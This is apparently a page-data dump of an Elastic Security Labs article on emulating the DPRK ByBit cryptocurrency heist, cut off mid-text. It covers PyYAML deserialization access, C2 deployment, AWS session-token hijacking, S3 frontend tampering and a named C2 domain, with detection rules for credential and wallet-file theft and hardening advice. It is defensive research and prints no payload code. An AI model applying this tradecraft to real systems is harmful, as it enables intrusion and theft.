“[Suspicious Executable File Creation via Python](https://github.com/elastic/detection-rules/blob/84966f02a1b71cce13db22b6c348cb46560529b7/hunting/macos/docs/command_and_control_suspicious_executable_file_creation_via_python.md)”:** Detects when an executable file gets created or modified by Python in suspicious or unusual directories. \n\n**Rule Name: “[Python Library Load and Delete](https://github.com/elastic/detection-rules/blob/bbfc026c95fbd9491cdbd06e779e1598ad63a31f/hunting/macos/docs/defense_evasion_python_library_load_and_delete.md)”:** Detects when a shared library, located within the users home directory, gets loaded by Python followed by the deletion of the library shortly after by the same Python process.\n\n**Rule Name: “[Unusual Library Load via Python](https://github.com/elastic/detection-rules/blob/bbfc026c95fbd9491cdbd06e779e1598ad63a31f/hunting/macos/docs/execution_unusual_library_load_via_python.md)”:** Detects when a shared library gets loaded by Python that does not denote itself as a .dylib or .so file and is located within the users home directory.\n\n**Rule Name: “[In-Memory JXA Execution via ScriptingAdditions](https://github.com/elastic/endpoint-rules/blob/13bad7e92e53f078b97bbeb376aedb23797be21b/rules/macos/defense_evasion_potential_in_memory_jxa_load_via_untrusted_or_unsigned_binary.toml)”:** Detects the in-memory load and execution of a JXA script.\n\n##### Python Loader Script Ret == 2\n\n**Rule Name: “[Potential Python Stealer](https://github.com/elastic/detection-rules/blob/bbfc026c95fbd9491cdbd06e779e1598ad63a31f/hunting/macos/docs/credential_access_potential_python_stealer.md)”:** Detects when a Python script gets executed followed shortly after by at least three attempts to access sensitive files by the same Python process.\n\n**Rule Name: “[Self-Deleted Python Script Accessing Sensitive Files](https://github.com/elastic/detection-rules/blob/bbfc026c95fbd9491cdbd06e779e1598ad63a31f/hunting/macos/docs/defense_evasion_self_deleted_python_script_accessing_sensitive_files.md)”:** Detects when a Python script gets deleted and sensitive files are accessed shortly after by the same Python process.\n\n##### Python Loader Script Ret == 3\n\n**Rule Name: “[Unsigned or Untrusted Binary Execution via Python](https://github.com/elastic/detection-rules/blob/bbfc026c95fbd9491cdbd06e779e1598ad63a31f/hunting/macos/docs/execution_unsigned_or_untrusted_binary_execution_via_python.md)”:** Detects when an unsigned or untrusted binary gets executed by Python where the executable is located within a suspicious directory.\n\n**Rule Name: “[Unsigned or Untrusted Binary Fork via Python](https://github.com/elastic/detection-rules/blob/bbfc026c95fbd9491cdbd06e779e1598ad63a31f/hunting/macos/docs/execution_unsigned_or_untrusted_binary_fork_via_python.md)”:** Detects when an unsigned or untrusted binary gets fork exec’d by Python where the process argument is the path to a file within the users home directory.\n\n**Rule Name: “[Cloud Credential Files Accessed by Process in Suspicious Directory](https://github.com/elastic/endpoint-rules/blob/13bad7e92e53f078b97bbeb376aedb23797be21b/rules/macos/credential_access_cloud_credential_file_accessed_by_untrusted_or_unsigned_process.toml)”:** Detects when cloud credentials are accessed by a process running from a suspicious directory.\n\n#### SIEM Detections for AWS CloudTrail Logs\n\n**Rule Name: “[STS Temporary IAM Session Token Used from Multiple Addresses](https://github.com/elastic/detection-rules/blob/44a2f4c41aa1482ec545f0391040e254c29a8d80/rules/integrations/aws/initial_access_iam_session_token_used_from_multiple_addresses.toml)”:** Detects AWS IAM session tokens (e.g. ASIA\\*) being used from multiple source IP addresses in a short timeframe, which may indicate credential theft and reuse from adversary infrastructure.\n\n**Rule Name: “[IAM Attempt to Register Virtual MFA Device with Temporary Credentials](https://github.com/elastic/detection-rules/blob/2f4a310cc5d75f8d8f2a2d0f5ad5e5a4537e26a3/rules/integrations/aws/persistence_aws_attempt_to_register_virtual_mfa_device.toml)”:** Detects attempts to call CreateVirtualMFADevice or EnableMFADevice with AWS session tokens. This may reflect an attempt to establish persistent access using hijacked short-term credentials.\n\n**Rule Name: “[API Calls to IAM via Temporary Session Tokens](https://github.com/elastic/detection-rules/blob/b64ecc925304b492d7855d357baa6c68711eef9a/rules/integrations/aws/persistence_iam_sts_api_calls_via_user_session_token.toml)”:** Detects use of sensitive iam.amazonaws.com API operations by a principal using temporary credentials (e.g. session tokens with ASIA\\* prefix). These operations typically require MFA or should only be performed via the AWS console or federated users. Not CLI or automation tokens.\n\n**Rule Name: “[S3 Static Site JavaScript File Uploaded via PutObject](https://github.com/elastic/detection-rules/blob/29dfe1217d1320ab400d051de377664fdbb09493/rules/integrations/aws/impact_s3_static_site_js_file_uploaded.toml)”:** Identifies attempts by IAM users to upload or modify JavaScript files in the static/js/ directory of an S3 bucket, which can signal frontend tampering (e.g. injection of malicious code)\n\n**Rule Name: “[AWS CLI with Kali Linux Fingerprint Identified](https://github.com/elastic/detection-rules/blob/b35f7366e92321105f61249b233f436c40b59c19/rules/integrations/aws/initial_access_kali_user_agent_detected_with_aws_cli.toml)”:** Detects AWS API calls made from a system using Kali Linux, as indicated by the user\\_agent.original string. This may reflect attacker infrastructure or unauthorized access from red team tooling.\n\n**Rule Name: “[S3 Excessive or Suspicious GetObject Events](https://github.com/elastic/detection-rules/blob/main/hunting/aws/queries/s3_public_bucket_rapid_object_access_attempts.toml)”:** Detects a high volume of S3 GetObject actions by the same IAM user or session within a short time window. This may indicate S3 data exfiltration using tools like AWS CLI command *sync* \\- particularly targeting static site files or frontend bundles. Note, this is a hunting query and should be adjusted accordingly.\n\n#### SIEM Detections for Docker Abuse\n\n**Rule Name: “[Sensitive File Access via Docker](https://github.com/elastic/detection-rules/blob/bbfc026c95fbd9491cdbd06e779e1598ad63a31f/hunting/macos/docs/execution_suspicious_file_access_via_docker.md)”:** Detects when Docker accesses sensitive host files (“ssh”, “aws”, “gcloud”, “azure”, “web browser”, “crypto wallet files”). \n\n**Rule Name: “[Suspicious Executable File Modification via Docker](https://github.com/elastic/detection-rules/blob/bbfc026c95fbd9491cdbd06e779e1598ad63a31f/hunting/macos/docs/execution_suspicious_executable_file_modification_via_docker.md)”:** Detects when Docker creates or modifies an executable file within a suspicious or unusual directory. \n\nIf your macOS agent policy includes the [Docker data integration](https://www.elastic.co/docs/reference/beats/filebeat/filebeat-input-container), you can collect valuable telemetry that helps surface malicious container activity on user systems. In our emulation, this integration allowed us to ingest Docker logs (into the metrics index), which we then used to build a detection rule capable of identifying indicators of compromise and suspicious container executions associated with the malicious application.\n\n![](/assets/images/bit-bybit/image17.png)\n\n## Mitigations\n\n### Social Engineering \n\nSocial engineering plays a major role in many intrusions, but especially with the DPRK. They are highly adept at targeting and approaching their victims utilizing trusted public platforms like LinkedIn, Telegram, X or Discord to initiate contact and appear legitimate. Many of their social engineering campaigns attempt to convince the user to download and execute some kind of project, application or script whether it be out of necessity (job application), distress (debugging assistance) etc.. Mitigation of targeting that leverage social engineering is difficult and takes a concerted effort by a company to ensure their employees are regularly trained to recognize these attempts, applying the proper skepticism and caution when engaging outside entities and even the open source communities. \n\n* User Awareness Training\n* Manual Static Code Review \n* Static Code and Dependency Scanning\n\nBandit ([GitHub - PyCQA/bandit: Bandit is a tool designed to find common security issues in Python code.](https://github.com/PyCQA/bandit)) is a great example of an open source tool a developer could use to scan the Python application and its scripts prior to execution in order to surface common Python security vulnerabilities or dangerous issues that may be present in the code.\n\n![](/assets/images/bit-bybit/image19.png)\n\n### Application and Device Management\n\nApplication controls via a device management solution or a binary authorization framework like the open source tool Santa ([GitHub - northpolesec/santa: A binary and file access authorization system for macOS.](https://github.com/northpolesec/santa)) could have been used to enforce notarization and block execution from suspicious paths. This would have prevented the execution of the Poseidon payload dropped to the system for persistence, and could have prevented access to sensitive files.\n\n### EDR/XDR\n\nTo effectively defend against nation-state threats—and the many other attacks targeting macOS—it's critical to have an EDR solution in place that provides rich telemetry and correlation capabilities to detect and prevent script-based attacks. Taking it a step further, an EDR platform like Elastic allows you to ingest AWS logs alongside endpoint data, enabling unified alerting and visibility through a single pane of glass. When combined with AI-powered correlation, this approach can surface cohesive attack narratives, significantly accelerating response and improving your ability to act quickly if such an attack occurs.\n\n![Elastic Alerts Dashboard](/assets/images/bit-bybit/image3.png)\n\n### AWS Credential Exposure and Session Token Hardening\n\nIn this attack, the adversary leveraged a stolen AWS user session token (with the ASIA* prefix), which had been issued via the GetSessionToken API using MFA. These credentials were likely retrieved from the macOS developer environment — either from exported environment variables or default AWS config paths (e.g., `~/.aws/credentials`).\n\nTo mitigate this type of access, organizations can implement the following defensive strategies:\n\n1. **Reduce Session Token Lifetimes and Move Away from IAM Users**: Avoid issuing long-lived session tokens to IAM users. Instead, enforce short token durations (e.g., 1 hour or less) and adopt AWS SSO (IAM Identity Center) for all human users. This makes session tokens ephemeral, auditable, and tied to identity federation. Disabling sts:GetSessionToken permissions for IAM users altogether is the strongest approach, and IAM Identity Center allows this transition.\n2. **Enforce Session Context Restrictions for IAM API Usage**: Implement IAM policy condition blocks that explicitly deny sensitive IAM operations, such as *iam:CreateVirtualMFADevice* or *iam:AttachUserPolicy*, if the request is made using temporary credentials. This ensures that session-based keys, such as those used in the attack, cannot escalate privileges or modify identity constructs.\n3. **Limit MFA Registration to Trusted Paths**: Block MFA device creation (*CreateVirtualMFADevice*, *EnableMFADevice*) via session tokens unless coming from trusted networks, devices, or IAM roles. Use *aws:SessionToken* or *aws:ViaAWSService* as policy context keys to enforce this. This would have prevented the adversary from attempting MFA-based persistence using the hijacked session.\n\n### S3 Application Layer Hardening (Frontend Tampering)\n\nAfter obtaining the AWS session token, the adversary did not perform any IAM enumeration — instead, they pivoted quickly to S3 operations. Using the AWS CLI and temporary credentials, they listed S3 buckets and modified static frontend JavaScript hosted on a public S3 bucket. This allowed them to replace the production Next.js bundle with a malicious variant designed to redirect transactions based on specific wallet addresses.\n\nTo prevent this type of frontend tampering, implement the following hardening strategies:\n\n1. **Enforce Immutability with S3 Object Lock**: Enable S3 Object Lock in compliance or governance mode on buckets hosting static frontend content. This prevents overwriting or deletion of files for a defined retention period - even by compromised users. Object Lock adds a strong immutability guarantee and is ideal for public-facing application layers. Access to put new objects (rather than overwrite) can still be permitted via deployment roles.\n2. **Implement Content Integrity with Subresource Integrity (SRI)**: Include SRI hashes (e.g., SHA-256) in the \u0026lt;script\u003e tags within index.html to ensure the frontend only executes known, validated JavaScript bundles. In this attack, the lack of integrity checks allowed arbitrary JavaScript to be served and executed from the S3 bucket. SRI would have blocked this behavior at the browser level.\n3. **Restrict Upload Access Using CI/CD Deployment Boundaries**: Developers should never have direct write access to production S3 buckets. Use separate AWS accounts or IAM roles for development and CI/CD deployment. Only OIDC-authenticated GitHub Actions or trusted CI pipelines should be permitted to upload frontend bundles to production buckets. This ensures human credentials, even if compromised, cannot poison production.\n4. **Lock Access via CloudFront Signed URLs or Use S3 Versioning**: If the frontend is distributed via CloudFront, restrict access to S3 using signed URLs and remove public access to the S3 origin. This adds a proxy and control layer. Alternatively, enable S3 versioning and monitor for overwrite events on critical assets (e.g., /static/js/*.js). This can help detect tampering by adversaries attempting to replace frontend files.\n\n## Attack Discovery (AD)\n\nAfter completing the end-to-end attack emulation, we tested Elastic’s new AI Attack Discovery feature to see if it could connect the dots between the various stages of the intrusion. Attack Discovery integrates with an LLM of your choice to analyze alerts across your stack and generate cohesive attack narratives. These narratives help analysts quickly understand what happened, reduce response time, and gain high-level context. In our test, it successfully correlated the endpoint compromise with the AWS intrusion, providing a unified story that an analyst could use to take informed action.\n\n![Elastic Attack Discovery](/assets/images/bit-bybit/image10.png)\n\n## OSQuery\n\nWhen running Elastic Defend through Elastic Agent, you can also deploy the OSQuery Manager integration to centrally manage Osquery across all agents in your Fleet. This enables you to query host data using distributed SQL. During our testing of the Dockerized malicious application, we used OSQuery to inspect the endpoint and successfully identified the container running with privileged permissions. \n\n```sql\nSELECT name, image, readonly_rootfs, privileged FROM docker_containers\n```\n\n![Elastic OSQuery Live Query](/assets/images/bit-bybit/image18.png)\n\nWe scheduled this query to run on a recurring basis, sending results back to our Elastic Stack. From there, we built a threshold-based detection rule that alerts whenever a new privileged container appears on a user’s system and hasn’t been observed in the past seven days.\n\n## Conclusion\n\nThe ByBit attack was one of the most consequential intrusions attributed to DPRK threat actors—and thanks to detailed reporting and available artifacts, it also provided a rare opportunity for defenders to emulate the full attack chain end to end. By recreating the compromise of a SAFE developer’s macOS workstation—including initial access, payload execution, and AWS pivoting—we validated our detection capabilities against real-world nation-state tradecraft.\n\nThis emulation not only highlighted technical insights—like how PyYAML deserialization can be abused to gain initial access—but also reinforced critical lessons in operational defense: the value of user awareness, behavior-based EDR coverage, secure developer workflows, effective cloud IAM policies, cloud logging and holistic detection/response across platforms.\n\nAdversaries are innovating constantly, but so are defenders—and this kind of research helps tip the balance. We encourage you to follow [@elasticseclabs](https://x.com/elasticseclabs) and check out our threat research at [elastic.co/security-labs](https://www.elastic.co/security-labs) to stay ahead of evolving adversary techniques.\n\nResources:\n\n1. [Bybit – What We Know So Far](https://www.sygnia.co/blog/sygnia-investigation-bybit-hack/)\n2. [Safe.eth on X: \"Investigation Updates and Community Call to Action\"](https://x.com/safe/status/1897663514975649938)\n3. [Cryptocurrency APT Intelligence: Unveiling Lazarus Group’s Intrusion Techniques](https://slowmist.medium.com/cryptocurrency-apt-intelligence-unveiling-lazarus-groups-intrusion-techniques-a1a6efda7d34)\n4. [Slow Pisces Targets Developers With Coding Challenges and Introduces New Customized Python Malware](https://unit42.paloaltonetworks.com/slow-pisces-new-custom-malware/)\n5. [Code of Conduct: DPRK’s Python-fueled intrusions into secured networks](https://www.elastic.co/security-labs/dprk-code-of-conduct)\n6. [Elastic catches DPRK passing out KANDYKORN](https://www.elastic.co/security-labs/elastic-catches-dprk-passing-out-kandykorn)","code":"var Component=(()=\u003e{var h=Object.create;var o=Object.defineProperty;var p=Object.getOwnPropertyDescriptor;var u=Object.getOwnPropertyNames;var m=Object.getPrototypeOf,g=Object.prototype.hasOwnProperty;var f=(i,e)=\u003e()=\u003e(e||i((e={exports:{}}).exports,e),e.exports),y=(i,e)=\u003e{for(var n in e)o(i,n,{get:e[n],enumerable:!0})},r=(i,e,n,s)=\u003e{if(e\u0026\u0026typeof e==\"object\"||typeof e==\"function\")for(let a of u(e))!g.call(i,a)\u0026\u0026a!==n\u0026\u0026o(i,a,{get:()=\u003ee[a],enumerable:!(s=p(e,a))||s.enumerable});return i};var b=(i,e,n)=\u003e(n=i!=null?h(m(i)):{},r(e||!i||!i.__esModule?o(n,\"default\",{value:i,enumerable:!0}):n,i)),w=i=\u003er(o({},\"__esModule\",{value:!0}),i);var l=f((P,c)=\u003e{c.exports=_jsx_runtime});var A={};y(A,{default:()=\u003eS,frontmatter:()=\u003ev});var t=b(l()),v={title:\"Bit ByBit - emulation of the DPRK's largest cryptocurrency heist\",slug:\"bit-bybit\",date:\"2025-05-06\",description:\"A high-fidelity emulation of the DPRK's largest cryptocurrency heist via a compromised macOS developer and AWS pivots.\",author:[{slug:\"colson-wilhoit\"},{slug:\"terrance-dejesus\"}],image:\"bit-bybit.jpg\",category:[{slug:\"attack-pattern\"},{slug:\"detection-science\"}]};function d(i){let e=Object.assign({h2:\"h2\",p:\"p\",ul:\"ul\",li:\"li\",a:\"a\",img:\"img\",strong:\"strong\",code:\"code\",h3:\"h3\",h4:\"h4\",pre:\"pre\",h5:\"h5\",br:\"br\",em:\"em\",ol:\"ol\"},i.components);return(0,t.jsxs)(t.Fragment,{children:[(0,t.jsx)(e.h2,{id:\"key-takeaways\",children:\"Key takeaways\"}),`\n`,(0,t.jsx)(e.p,{children:\"Key takeaways from this research:\"}),`\n`,(0,t.jsxs)(e.ul,{children:[`\n`,(0,t.jsx)(e.li,{children:\"PyYAML was deserialization as initial access vector\"}),`\n`,(0,t.jsx)(e.li,{children:\"The attack leveraged session token abuse and AWS lateral movement\"}),`\n`,(0,t.jsx)(e.li,{children:\"Static site supply chain tampering\"}),`\n`,(0,t.jsx)(e.li,{children:\"Docker-based stealth on macOS\"}),`\n`,(0,t.jsx)(e.li,{children:\"End-to-end detection correlation with Elastic\"}),`\n`]}),`\n`,(0,t.jsx)(e.h2,{id:\"introduction\",children:\"Introduction\"}),`\n`,(0,t.jsxs)(e.p,{children:[\"On February 21, 2025, the crypto world was shaken when approximately 400,000 ETH vanished from ByBit \\u2014one of the industry\\u2019s largest cryptocurrency exchanges. Behind this incredible theft is believed to be North Korea\\u2019s elite cyber-offensive unit, referred to as \",(0,t.jsx)(e.a,{href:\"https://www.ic3.gov/PSA/2025/PSA250226\",rel:\"nofollow\",children:\"TraderTraitor\"}),\". Exploiting a trusted vendor relationship with Safe{Wallet}, a multisig (multi-signature) wallet platform, TraderTraitor transformed a routine transaction into a billion-dollar heist. Supply chain targeting has become a hallmark of the DPRK\\u2019s cyber strategy, underpinning the regime\\u2019s theft of more than \",(0,t.jsx)(e.a,{href:\"https://www.chainalysis.com/blog/crypto-hacking-stolen-funds-2025/\",rel:\"nofollow\",children:\"$6 billion\"}),\" in cryptocurrency since 2017. In this article we\\u2019ll dissect this attack, carefully emulate its tactics within a controlled environment, and provide practical lessons to reinforce cybersecurity defenses using Elastic\\u2019s product and features.\"]}),`\n`,(0,t.jsxs)(e.p,{children:[\"Our emulation of this threat is based on research released by \",(0,t.jsx)(e.a,{href:\"https://www.sygnia.co/blog/sygnia-investigation-bybit-hack/\",rel:\"nofollow\",children:\"Sygnia\"}),\", \",(0,t.jsx)(e.a,{href:\"https://x.com/safe/status/1897663514975649938\",rel:\"nofollow\",children:\"Mandiant/SAFE\"}),\", \",(0,t.jsx)(e.a,{href:\"https://slowmist.medium.com/cryptocurrency-apt-intelligence-unveiling-lazarus-groups-intrusion-techniques-a1a6efda7d34\",rel:\"nofollow\",children:\"SlowMist\"}),\", and \",(0,t.jsx)(e.a,{href:\"https://unit42.paloaltonetworks.com/slow-pisces-new-custom-malware/\",rel:\"nofollow\",children:\"Unit42\"}),\".\"]}),`\n`,(0,t.jsx)(e.p,{children:(0,t.jsx)(e.img,{src:\"/assets/images/bit-bybit/image12.png\",alt:\"\",width:\"1433\",height:\"793\"})}),`\n`,(0,t.jsx)(e.h2,{id:\"chronology-of-events\",children:\"Chronology of events\"}),`\n`,(0,t.jsx)(e.p,{children:\"If you're here for the technical emulation details, feel free to skip ahead. But for context\\u2014 and to clarify what was officially reported\\u2014 we've compiled a high-level timeline of events to ground our assumptions based on the research referenced above.\"}),`\n`,(0,t.jsxs)(e.p,{children:[(0,t.jsx)(e.strong,{children:\"February 2, 2025\"}),\" \\u2013 Infrastructure Setup\"]}),`\n`,(0,t.jsx)(e.p,{children:\"The attacker registers the domain getstockprice[.]com via Namecheap. This infrastructure is later used as the C2 endpoint in the initial access payload.\"}),`\n`,(0,t.jsxs)(e.p,{children:[(0,t.jsx)(e.strong,{children:\"February 4, 2025\"}),\" \\u2013 Initial Compromise\"]}),`\n`,(0,t.jsxs)(e.p,{children:[\"Developer1\\u2019s macOS workstation is compromised after executing a malicious Python application. This application contained Docker-related logic and referenced the attacker\\u2019s domain. The file path (\",(0,t.jsx)(e.code,{children:\"~/Downloads/\"}),\") and malware behavior suggest social engineering (likely via Telegram or Discord, consistent with past \",(0,t.jsx)(e.a,{href:\"https://www.elastic.co/security-labs/elastic-catches-dprk-passing-out-kandykorn\",rel:\"nofollow\",children:\"REF7001\"}),\" and UNC4899 tradecraft).\"]}),`\n`,(0,t.jsxs)(e.p,{children:[(0,t.jsx)(e.strong,{children:\"February 5, 2025\"}),\" \\u2013 AWS Intrusion Begins\"]}),`\n`,(0,t.jsx)(e.p,{children:\"Attacker successfully accesses Safe{Wallet}\\u2019s AWS environment using Developer1\\u2019s active AWS session tokens.Attacker attempts (unsuccessfully) to register their own virtual MFA device to Developer1\\u2019s IAM user, indicating a persistence attempt.\"}),`\n`,(0,t.jsxs)(e.p,{children:[(0,t.jsx)(e.strong,{children:\"February 5\\u201317\"}),\": Reconnaissance activity begins within the AWS environment. During this time, attacker actions likely included the enumeration of IAM roles, S3 buckets, and other cloud assets.\"]}),`\n`,(0,t.jsxs)(e.p,{children:[(0,t.jsx)(e.strong,{children:\"February 17, 2025\"}),\" \\u2013 AWS Command and Control Activity\"]}),`\n`,(0,t.jsx)(e.p,{children:\"Confirmed C2 traffic observed in AWS. This marks the shift from passive reconnaissance to active staging of the attack.\"}),`\n`,(0,t.jsxs)(e.p,{children:[(0,t.jsx)(e.strong,{children:\"February 19, 2025\"}),\" \\u2013 Web Application Tampering\"]}),`\n`,(0,t.jsx)(e.p,{children:\"A snapshot of app.safe.global (Safe{Wallet}\\u2019s statically hosted Next.js web app) captured by the Wayback Machine shows the presence of malicious JavaScript. The payload was crafted to detect a Bybit multisig transaction and modify it on-the-fly, redirecting funds to the attacker\\u2019s wallet.\"}),`\n`,(0,t.jsxs)(e.p,{children:[(0,t.jsx)(e.strong,{children:\"February 21, 2025\"}),\" \\u2013 Execution and Cleanup\"]}),`\n`,(0,t.jsx)(e.p,{children:\"The exploit transaction is executed against Bybit via the compromised Safe{Wallet} frontend.\"}),`\n`,(0,t.jsx)(e.p,{children:\"A new Wayback Machine snapshot confirms the JavaScript payload has been removed\\u2014indicating the attacker manually scrubbed it post-execution.\"}),`\n`,(0,t.jsx)(e.p,{children:\"The Bybit heist transaction is finalized. Approximately 400,000 ETH is stolen. Subsequent analysis by Sygnia and others confirms that Bybit infrastructure was not directly compromised\\u2014Safe{Wallet} was the sole point of failure.\"}),`\n`,(0,t.jsx)(e.h2,{id:\"assumptions-for-emulation\",children:\"Assumptions for emulation\"}),`\n`,(0,t.jsxs)(e.ul,{children:[`\n`,(0,t.jsx)(e.li,{children:`Initial Social Engineering Vector:\nSocial engineering was employed to compromise Developer1, resulting in the execution of a malicious Python script. The exact details of the social engineering tactic (such as specific messaging, impersonation techniques, or the communication platform used) remain unknown.`}),`\n`,(0,t.jsx)(e.li,{children:`Loader and Second-Stage Payload:\nThe malicious Python script executed a second-stage loader. It is currently unclear whether this loader and subsequent payloads match those detailed in Unit42's reporting, despite alignment in the initial access Python application's characteristics.`}),`\n`,(0,t.jsxs)(e.li,{children:[`Safe Application Structure and Workflow:\nThe compromised application (`,(0,t.jsx)(e.code,{children:\"app.global.safe\"}),\") appears to be a Next.js application hosted statically in AWS S3. However, specific details such as its exact routes, components, development processes, version control methods, and production deployment workflow are unknown.\"]}),`\n`,(0,t.jsx)(e.li,{children:`JavaScript Payload Deployment:\nWhile attackers injected malicious JavaScript into the Safe{Wallet} application, it is unclear whether this involved rebuilding and redeploying the entire application or merely overwriting/modifying a specific JavaScript file.`}),`\n`,(0,t.jsx)(e.li,{children:`AWS IAM and Identity Management Details:\nDetails regarding Developer1\\u2019s IAM permissions, roles, and policy configurations within AWS are unknown. Additionally, whether Safe{Wallet} used AWS IAM Identity Center or alternative identity management solutions remains unclear.`}),`\n`,(0,t.jsxs)(e.li,{children:[`AWS Session Token Retrieval and Usage:\nWhile reports confirm the attackers used temporary AWS session tokens, details about how Developer1 originally retrieved these tokens (such as through AWS SSO, `,(0,t.jsx)(e.code,{children:\"GetSessionToken\"}),\", or specific MFA configurations) and how they were subsequently stored or utilized (e.g., environment variables, AWS config files, custom scripts) are unknown.\"]}),`\n`,(0,t.jsx)(e.li,{children:`AWS Enumeration and Exploitation Techniques:\nThe exact tools, enumeration methodologies, AWS API calls, and specific actions carried out by attackers within the AWS environment between February 5 and February 17, 2025, remain undisclosed.`}),`\n`,(0,t.jsx)(e.li,{children:`AWS Persistence Mechanisms:\nAlthough there is an indication of potential persistence within AWS infrastructure (e.g., via EC2 instance compromise), explicit details including tools, tactics, or persistence methods are not provided.`}),`\n`]}),`\n`,(0,t.jsx)(e.h2,{id:\"overview-of-the-attack\",children:\"Overview of the attack\"}),`\n`,(0,t.jsx)(e.p,{children:\"Targeting companies within the crypto ecosystem is a common occurrence. DPRK continually targets these companies due to the relative anonymity and decentralized nature of cryptocurrency, enabling the regime to evade global financial sanctions. North Korea's offensive cyber groups excel at identifying and exploiting vulnerabilities, resulting in billions of dollars in losses.\"}),`\n`,(0,t.jsxs)(e.p,{children:[\"This intrusion began with the \",(0,t.jsx)(e.a,{href:\"https://x.com/safe/status/1897663514975649938?s=09\",rel:\"nofollow\",children:\"targeted compromise\"}),\" of a developer's MacOS workstation at Safe{Wallet}, ByBit\\u2019s trusted multi-signature wallet provider. Initial access involved social engineering, likely approaching the developer via platforms like LinkedIn, Telegram, or Discord, based on previous campaigns, and convincing them to download an archive file containing a crypto-themed Python application\\u2014an initial access procedure favored by DPRK. This Python application also included a Dockerized version of the application that could be run inside a privileged container. Unknown to the developer, this seemingly benign application enabled DPRK operators to exploit a remote code execution (RCE) \",(0,t.jsx)(e.a,{href:\"https://www.cvedetails.com/cve/CVE-2017-18342/\",rel:\"nofollow\",children:\"vulnerability\"}),\" in the PyYAML library, providing code execution capabilities and subsequently control over the host system.\"]}),`\n`,(0,t.jsxs)(e.p,{children:[\"After gaining initial access to the developer's machine, attackers deployed \",(0,t.jsx)(e.a,{href:\"https://github.com/its-a-feature/Mythic\",rel:\"nofollow\",children:\"MythicC2\"}),\"'s \",(0,t.jsx)(e.a,{href:\"https://github.com/MythicAgents/poseidon\",rel:\"nofollow\",children:\"Poseidon agent\"}),\", a robust Golang-based payload offering advanced stealth and extensive post-exploitation capabilities for macOS environments. The attackers then may have conducted reconnaissance, discovering the developer's access to Safe{Wallet}\\u2019s AWS environment and the usage of temporary AWS user session tokens secured via multi-factor authentication (MFA). Armed with the developer's AWS access key ID, secret key, and temporary session token, the threat actors then authenticated into Safe{Wallet}\\u2019s AWS environment within approximately 24 hours, capitalizing on the 12-hour validity of the session tokens.\"]}),`\n`,(0,t.jsxs)(e.p,{children:[\"Attempting to ensure persistent access to the AWS environment, the attackers tried to register their own MFA device. However, AWS temporary session tokens do not permit IAM API calls without \",(0,t.jsx)(e.a,{href:\"https://docs.aws.amazon.com/STS/latest/APIReference/API_GetSessionToken.html#:~:text=You%20cannot%20call%20any%20IAM,in%20the%20IAM%20User%20Guide\",rel:\"nofollow\",children:\"MFA authentication context\"}),\", causing this attempt to fail. Following this minor setback, the threat actor enumerated the AWS environment, eventually discovering an S3 bucket hosting Safe{Wallet}'s static Next.js user interface.\"]}),`\n`,(0,t.jsx)(e.p,{children:\"The attackers could then have downloaded this Next.js application\\u2019s bundled code, spending nearly two weeks analyzing its functionality before injecting malicious JavaScript into the primary JS file and overwriting the legitimate version hosted in the S3 bucket. The malicious JavaScript code was activated exclusively on transactions initiated from Bybit\\u2019s cold wallet address and an attacker-controlled address. By inserting hardcoded parameters, the script circumvented transaction validation checks and digital signature verifications, effectively deceiving ByBit wallet approvers who implicitly trusted the Safe{Wallet} interface.\"}),`\n`,(0,t.jsx)(e.p,{children:\"Shortly thereafter, the DPRK initiated a fraudulent transaction, triggering the malicious script to alter transaction details. This manipulation, likely, contributed to misleading the wallet signers into approving the illicit transfer, thereby granting DPRK operatives control of approximately 400,000 ETH. These stolen funds were then laundered into attacker-controlled wallets.\"}),`\n`,(0,t.jsx)(e.p,{children:\"We chose to end our research and behavior emulation at the compromise of the Next.js application. Thus, we do not dive into the blockchain technologies, such as ETH smart contracts, contract addresses, and sweep ETH calls discussed in several other research publications.\"}),`\n`,(0,t.jsx)(e.h2,{id:\"emulating-the-attack\",children:\"Emulating the attack\"}),`\n`,(0,t.jsx)(e.p,{children:\"To truly understand this breach we decided to emulate the entire attack chain in a controlled lab environment. As security researchers at Elastic, we wanted to walk in the footsteps of the attacker to understand how this operation unfolded at each stage: from code execution to AWS session hijacking and browser-based transaction manipulation.\"}),`\n`,(0,t.jsx)(e.p,{children:\"This hands-on emulation served a dual purpose. First, it allowed us to analyze the attack at a granular, technical level to uncover practical detection and prevention opportunities. Second, it gave us the chance to test Elastic\\u2019s capabilities end-to-end\\u2014to see whether our platform could not only detect each phase of the attack, but also correlate them into a cohesive narrative that defenders could act on.\"}),`\n`,(0,t.jsx)(e.h3,{id:\"macos-endpoint-compromise\",children:\"MacOS endpoint compromise\"}),`\n`,(0,t.jsxs)(e.p,{children:[\"Thanks to \",(0,t.jsx)(e.a,{href:\"https://unit42.paloaltonetworks.com/\",rel:\"nofollow\",children:\"Unit42\"}),\"\\u2019s detailed write-up\\u2014and more critically, uploading recovered samples to VirusTotal\\u2014we were able to emulate the attack end-to-end using the actual payloads observed in the wild. This included:\"]}),`\n`,(0,t.jsxs)(e.ul,{children:[`\n`,(0,t.jsx)(e.li,{children:\"PyYAML deserialization payload\"}),`\n`,(0,t.jsx)(e.li,{children:\"Python loader script\"}),`\n`,(0,t.jsx)(e.li,{children:\"Python stealer script\"}),`\n`]}),`\n`,(0,t.jsx)(e.h4,{id:\"malicious-python-application\",children:\"Malicious Python Application\"}),`\n`,(0,t.jsxs)(e.p,{children:[\"The initial access Python application we used in our emulation aligns with samples highlighted and shared by \",(0,t.jsx)(e.a,{href:\"https://www.slowmist.com/\",rel:\"nofollow\",children:\"SlowMist\"}),\" and corroborated by Mandiant's \",(0,t.jsx)(e.a,{href:\"https://x.com/safe/status/1897663514975649938\",rel:\"nofollow\",children:\"incident response findings\"}),\" from the SAFE developer compromise. This application also matched the directory structure of the application shown by Unit42 in their write-up. Attackers forked a legitimate stock-trading Python project from GitHub and backdoored it within a Python script named \",(0,t.jsx)(e.code,{children:\"data_fetcher.py\"}),\".\"]}),`\n`,(0,t.jsx)(e.p,{children:(0,t.jsx)(e.img,{src:\"/assets/images/bit-bybit/image13.png\",alt:\"Python Application Directory Structure\",width:\"554\",height:\"922\"})}),`\n`,(0,t.jsxs)(e.p,{children:[\"The application leverages \",(0,t.jsx)(e.a,{href:\"https://streamlit.io/\",rel:\"nofollow\",children:\"Streamlit\"}),\" to execute \",(0,t.jsx)(e.code,{children:\"app.py\"}),\", which imports the script \",(0,t.jsx)(e.code,{children:\"data_fetcher.py\"}),\".\"]}),`\n`,(0,t.jsx)(e.p,{children:(0,t.jsx)(e.img,{src:\"/assets/images/bit-bybit/image5.png\",alt:\"Python Application README.txt 